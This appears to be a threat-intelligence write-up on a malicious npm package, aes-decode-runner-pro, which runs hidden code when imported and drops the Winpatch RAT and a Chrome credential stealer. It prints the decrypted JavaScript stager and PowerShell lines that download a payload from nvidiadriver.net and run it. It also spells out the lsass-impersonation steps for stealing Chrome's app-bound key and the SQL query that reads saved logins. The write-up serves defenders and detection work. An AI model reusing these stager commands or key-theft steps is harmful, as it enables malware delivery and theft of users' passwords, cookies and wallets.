---
title: "aes-decode-runner-pro: an npm 'AES SDK' that drops Winpatch via a Nuitka Chrome ABE stealer"
date: 2026-05-27
summary: "aes-decode-runner-pro@1.0.9 sells itself as a `position-unit-codec → encode-decode-codec → AES-GCM` demo, and `require()` of the package decrypts a 6 KB hardcoded ciphertext with a hardcoded passphrase and `new Function()`s the result. That stage pulls a 6 MB Nuitka bundle from `nvidiadriver.net` and runs `wscript update.vbs` — cleave fingerprints the three `.pyd` modules as the Winpatch RAT family: `htxp0825` transport, seven `COMMAND0825…` verbs, and a Chrome app-bound-encryption stealer that impersonates `lsass.exe` to lift v20 keys."
packageName: aes-decode-runner-pro
ecosystem: npm
---

`abdrizak <aabdirizak13@gmail.com>` registered `aes-decode-runner-pro` on 2026-05-25 and walked the version from `1.0.1` to `1.0.10` in 24 hours. The description (`Layered custom codec pipeline with position-unit-codec, encode-decode-codec, and AES-GCM.`) and the `aes` / `aes-gcm` / `decode` / `codec` / `encryption` keyword list dress it up as a tutorial library, and the two declared deps — `position-unit-codec` and `encode-decode-codec`, both real, harmless packages by another publisher — supply the outer layers of the codec pipeline so the AES math actually works. Importing the package fires the chain immediately:

<pre class="lang-js"><code><span class="tok-com">// index.js</span>
<span class="tok-kw">const</span> pkg = <span class="tok-builtin">require</span>(<span class="tok-str">"./custom-codec"</span>);
pkg.<span class="tok-fn">run</span>();
module.exports = pkg;
</code></pre>

`run` is `runDefaultDecodedFunction` from `src/pipeline/custom-codec-pipeline.js`. It pulls a 6 KB AES-GCM ciphertext and key material out of `src/config/defaults.js`:

| Variable | Value |
| --- | --- |
| Ciphertext | `DEFAULT_FINAL_ENCODED_TEXT` (6 KB) |
| Passphrase | `default-dev-passphrase` |
| Salt | `encode-npm-c-salt` |
| KDF | scrypt |

The decoded plaintext comes out of three reversed codec layers:

1. `aes-256-gcm`
2. `encode-decode-codec`
3. `position-unit-codec`

The result is handed to `new Function("require", runnable)(require)` — `eval` with one indirection, so the static reader's eye slides off it.

The decrypted JS is a self-deleting PowerShell stager:

<pre class="lang-js"><code><span class="tok-kw">const</span> key = <span class="tok-str">"AB59097(*^^zxcvbn"</span>;
<span class="tok-kw">const</span> number = <span class="tok-str">"69 52 42 52 105 59 38 42 113 152 …"</span>; <span class="tok-com">// 224 ints</span>
<span class="tok-com">// per-byte: k = key[j]+103; out = k &gt;= num ? k - num : num</span>
fs.<span class="tok-fn">writeFileSync</span>(<span class="tok-str">"settings.ps1"</span>, decoded);
<span class="tok-builtin">require</span>(<span class="tok-str">"child_process"</span>).<span class="tok-fn">exec</span>(<span class="tok-str">'powershell -ExecutionPolicy Bypass -File ./settings.ps1'</span>)
  .<span class="tok-fn">on</span>(<span class="tok-str">"exit"</span>, () =&gt; fs.<span class="tok-fn">unlinkSync</span>(<span class="tok-str">"settings.ps1"</span>));
</code></pre>

Three lines come out the other end:

<pre class="lang-ps1"><code>curl.exe -k -o "$env:TEMP\winPatch.zip" http://nvidiadriver.net/verv1432/winpatch-bd9e.win
Expand-Archive -Force -Path "$env:TEMP\winPatch.zip" -DestinationPath "$env:TEMP\winPatch"
wscript "$env:TEMP\winPatch\update.vbs"
</code></pre>

`nvidiadriver.net` (Hetzner `95.216.92.207`) serves the payload as a 6 MB store-compressed zip behind an Express front-end with full helmet, CSP, and HSTS headers — the kind of dropper infrastructure you stand up once and reuse. The response advertises `Content-Disposition: attachment; filename="win-driver-bd9e.zip"`. Inside is a complete CPython 3.10 runtime alongside three Nuitka-compiled `.pyd` modules:

- `chost.exe` — `python.exe` unmodified, PDB `D:\_w\1\b\bin\amd64\python.pdb`, PSF cert intact
- Three `.pyd` modules — confirmed Nuitka by their constants:
  - `__nuitka_version__`
  - `__compiled__`
  - `PyMarshal_ReadObjectFromString`

Nuitka's compressed constants hide the C2 URL itself, but `cleave analyze` on the three modules fires twelve `well-known/malware/rat/winpatch::*` rules at once — campaign tag, transport, six command verbs, the Chrome-cookie task, the dump-file banner and filename, and two typo-fingerprint rules unique to the family. The Unicode constant table in `.rdata` shows why each one matched:

**`audiodriver.cp310-win_amd64.pyd` — the RAT dispatcher.** It opens a session to its server, fingerprints the host, and dispatches commands one at a time; persistence is a single `HKCU\…\Run` write pointing at the VBS the dropper just executed. Every transport, helper, and command constant carries the `0825` campaign tag:

| Constant | Role |
| --- | --- |
| `SVR0825URL` | C2 endpoint passed into `api.htxp0825Exchange` |
| `MACHINE0825HOST`, `genUUID0825`, `PID0825NAME` | host / install / process fingerprint |
| `DURATION0825ERROR_WAIT` | backoff between failed exchanges |
| `REG0825PATH`, `REG0825KEY` → `regStartup` | `HKEY_CURRENT_USER\…\Run` → `wscript.exe "…update.vbs"` |
| `COMMAND0825{AUTO,EXIT,INFORMATION,TERMINAL,FILE_UPLOAD,FILE_DOWNLOAD,WAIT}` | seven verbs, dispatched to matching `process0825*` handlers |
| `AUTO0825CHROME_COOKIE` | parameter passed to `auto.pyd` when `COMMAND0825AUTO` fires |

**`api.cp310-win_amd64.pyd` — the `htxp` transport.** Cleave matches `winpatch::campaign-htxp-exchange` on the exported `htxp0825Exchange`, and the surrounding constants in `.rsrc` spell out the wire format: ARC4-encrypted body plus an MD5 checksum, POSTed as `application/octet-stream` to whatever URL `audiodriver` passes in.

| Constant | Role |
| --- | --- |
| `packet0825make`, `packet0825decode` | encode/decode the wire frame |
| `Crypto.Cipher.ARC4.new`, `.encrypt` / `.decrypt` | symmetric body cipher |
| `hashlib.md5`, `.digest`, `SUM_LENGTH` | per-packet checksum |
| `requests.post`, `Content-Type: application/octet-stream` | HTTP carrier |
| `urandom`, `KEY_LENGTH` | per-session ARC4 key |

**`auto.cp310-win_amd64.pyd` — the Chrome ABE stealer.** This is the part most npm-dropped Windows stealers skip: Chrome's app-bound encryption binds the v20 key to a SYSTEM-only DPAPI scope, and `auto.pyd` pays the cost of getting there. The escalation chain:

1. Enable `SeDebugPrivilege`
2. Open `lsass.exe`
3. Duplicate its primary token
4. Call `NCryptOpenKey("Google Chromekey1")` under that impersonation
5. Use the returned key to unwrap `app_bound_encrypted_key` from `Local State`

Two cleave rules confirm the full chain: `winpatch::winpatch-chrome-stealer` matches on five module-unique strings together, and `credential-access/browser/chromium::chromium-app-bound-key-theft-binary` matches the ABE primitives. The recovered key decrypts three browser stores:

- `Login Data` (saved-logins SQLite)
- the cookie database
- `Local Extension Settings` (where browser-wallet extensions live)

Results are bannered `Chrome Saved Logins Dump` and written to `chrome_logins_dump.txt`. `audiodriver` uploads them over `htxp`.

| Constant | Role |
| --- | --- |
| `aSeDebugPrivilege`, `aTokenImpersonation`, `aSecurityImpersonation` | SYSTEM elevation primitives |
| `alssass_token`, `aimppersonation_token` | family-unique typos cleave keys off |
| `aNCryptOpenStorageProvider("Microsoft Software Key Storage Provider")` | CNG handle |
| `aNCryptOpenKey("Google Chromekey1")` | Chrome's named ABE key |
| `app_bound_encrypted_key`, `axor_key` | `Local State` field + XOR-wrap step |
| `SELECT origin_url, username_value, password_value, date_created FROM logins` | `Login Data` SQLite read |
| `aautoCookieMode`, `aautoGatherMode`, `azipDirectories` | cookies + `Local Extension Settings` (wallets) packaged |
| `uchrome_logins_dump.txt`, `uChrome Saved Logins Dump` | output filename + banner |

Winpatch's prior detonations all rode the usual delivery surfaces — cracked-software lures, fake installers, phishing. Watching its `0825` campaign tooling ride the npm registry instead — wrapped in an AES-GCM "tutorial library" that detonates at `require()` time — is the new bit, and the part that should generalize: a small JavaScript front-end is now a more comfortable place to hide a Windows native stealer than any of the channels its operators were using two months ago.

## Traits observed

|  | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/install-hook/library/import-time-eval` | `require()` of the package calls `pkg.run()` → `new Function("require", …)(require)` on a decrypted blob |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/anti-static/obfuscation/encoding/aes-gcm-static-key` | Stage-1 JS is `aes-256-gcm` with passphrase, salt, and ciphertext all hardcoded in `defaults.js` |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/command-and-control/dropper/execution/network-stage/curl-powershell-vbs` | `curl.exe -k` → `Expand-Archive` → `wscript update.vbs` chain written by the decrypted stager |
| <span class="sev-dot hostile" title="hostile"></span> | `well-known/malware/rat/winpatch` | Winpatch RAT family — cleave matches twelve campaign rules (`campaign-htxp-exchange`, `svr-url-key`, `campaign-uuid-helper`, six `cmd-*`, `chrome-cookie-task`, `stealer-cookie-dump-banner`, `stealer-dump-filename`) plus `stealer-lssass-typo` and `stealer-impersonation-typo` |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/credential-access/browser/chromium/app-bound-key-theft` | `aNCryptOpenStorageProvider("Microsoft Software Key Storage Provider")` → `aNCryptOpenKey("Google Chromekey1")` → `app_bound_encrypted_key` + `xor_key`, gated by `SeDebugPrivilege` + `lsass.exe` token impersonation |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/exfiltration/stealer/credential/browser/chrome-login-data-sqlite` | `SELECT origin_url, username_value, password_value, date_created FROM logins` → `chrome_logins_dump.txt` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/command-and-control/remote-access/custom-protocol/arc4-md5` | `htxp0825Exchange` posts ARC4-encrypted, MD5-checksummed `application/octet-stream` bodies to `SVR0825URL` with seven `COMMAND0825…` verbs |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/persistence/login/registry/autostart` | `HKCU\…\Run` writes `wscript.exe …update.vbs` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/anti-static/packing/nuitka/standalone` | Three `.pyd` modules with `__nuitka_version__`, `__compiled__`, `PyMarshal_ReadObjectFromString`; constants hidden in compressed blob |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/evasion/masquerade/identity/legitimate-binary` | `chost.exe` is unmodified CPython 3.10 `python.exe` renamed (PDB `python.pdb`, PSF cert string) |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/command-and-control/infrastructure/typosquat-domain` | `nvidiadriver.net` lookalike on Hetzner, Express + helmet front-end serving `winpatch-bd9e.win` as `win-driver-bd9e.zip` |
| <span class="sev-dot notable" title="notable"></span> | `objectives/evasion/self-delete/file/script` | `fs.unlinkSync("settings.ps1")` on the stager's `exit` event |
| <span class="sev-dot notable" title="notable"></span> | `objectives/supply-chain/metadata-anomaly/package/npm` | Empty `author`, no repo URL, 10 versions in 24 h, declared `start`/`test`/`decode` scripts all point at a `crypto/lib.min.js` not shipped in the tarball |

## Indicators

| Type | Value |
| --- | --- |
| Package | `aes-decode-runner-pro@1.0.9` (npm) |
| npm page | [npmjs.com/package/aes-decode-runner-pro](https://www.npmjs.com/package/aes-decode-runner-pro) |
| Published | `2026-05-26T16:24:58Z` (`1.0.10` followed 19 min later) |
| Tarball SHA-256 | `b7ebd4ee16d33e8210f48b3f2b1ef8e894d9726ee4d687c7e9a6c4d1b3043b40` |
| Tarball SHA-1 (npm `shasum`) | `44add86a440f1c2928604298f0f8e49685d5086a` |
| `src/config/defaults.js` SHA-256 | `1a7ab170e96f20a25eba56b9fcecee5cf4e49ba51533f5504f40e48ec52161de` |
| AES key material | passphrase `default-dev-passphrase`, salt `encode-npm-c-salt`, scrypt → aes-256-gcm |
| XOR key (Stage-2 PS1) | `AB59097(*^^zxcvbn` (`k = key[j]+103; out = k≥n ? k-n : n`) |
| Trigger | `require('aes-decode-runner-pro')` → `pkg.run()` (no `postinstall` needed) |
| Stage-2 URL | `http://nvidiadriver.net/verv1432/winpatch-bd9e.win` → `95.216.92.207` (Hetzner) |
| Stage-2 zip SHA-256 | `ddd5bd20fd92d4671073096c3e9230e9d3465588f6f7db0abb9618ed3339312a` (6,016,747 B) |
| `chost.exe` SHA-256 | `94a83686261e9364cf3386b61a01a9f70936e8547da8962d16f1f850226b8954` (CPython 3.10 `python.exe`) |
| `api.cp310-win_amd64.pyd` SHA-256 | `50ffce607867d8fa8eaf6ef5cd25a3c0e7e4415e881b9e55c04a67bcddb74fdf` |
| `audiodriver.cp310-win_amd64.pyd` SHA-256 | `164e322d6fbc62e254d73583acd7f39444c884d3f5e6a5d27db143fc25bc88b3` |
| `auto.cp310-win_amd64.pyd` SHA-256 | `17832aa629524ef6e8d8d6e9b6b902a8d324b559e3c36dbd0e221ab1690be871` |
| Persistence | `HKCU\…\Run` → `wscript.exe "$env:TEMP\winPatch\update.vbs"` |
| Family | Winpatch (cleave `well-known/malware/rat/winpatch`, traits revision `52c161754`) |
| Family fingerprints | Typo identifiers `lssass_token` and `imppersonation_token`; `0825` campaign tag on every command, transport, and helper constant; `htxp0825Exchange` ARC4+MD5 wire format |
| Publisher | `abdrizak <aabdirizak13@gmail.com>` |
